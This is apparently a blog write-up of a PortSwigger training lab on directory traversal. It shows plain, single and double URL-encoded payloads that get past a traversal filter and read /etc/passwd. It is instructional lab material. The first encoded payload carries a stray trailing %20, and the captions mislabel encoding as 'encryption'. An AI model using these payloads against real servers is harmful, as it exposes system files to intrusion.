---
layout: post
title:  "PortSwigger - Directory Traversal - Lab 4"
date:   2024-06-10 00:00
image:  /images/portswigger/WebSecurityAcademy.png
tags:   [directory-traversal]
categories: [PortSwigger]
---

# Lab 4 - Directory Traversal - File path traversal, traversal sequences stripped with superfluous URL-decode
><b>Lab Objective:</b>
<br/><br/>
This lab contains a path traversal vulnerability in the display of product images.
The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.<br/><br/>
To solve the lab, retrieve the contents of the `/etc/passwd` file.
<br/>
<br/>
<b>Reference:</b>
<br/>
<a href="https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode">Port Swigger - Lab 4</a>
<br/>
<a href="https://academy.ranakhalil.com/courses/1491236/lectures/44691842">Rana Khalil - Lab 4</a>
<br/>

### Solution
<hr/>

#### 1. No encoding:

![Directory Traversal - Lab 4 - No encryption](/images/portswigger/DirectoryTraversal/lab4/directory-traversal-lab4-no-encryption.png)


#### 2. Double url encode the payload

```
../../../../etc/passwd
```
#### First URL encoding:
```
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64%20
```

![Directory Traversal - Lab 4 - First Url Encoding](/images/portswigger/DirectoryTraversal/lab4/directory-traversal-lab4-first-encryption.png)

#### Second URL encoding:
```
%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34 
```
![Directory Traversal - Lab 4 - Second Url Encoding](/images/portswigger/DirectoryTraversal/lab4/directory-traversal-lab4-second-encryption.png)
<hr/>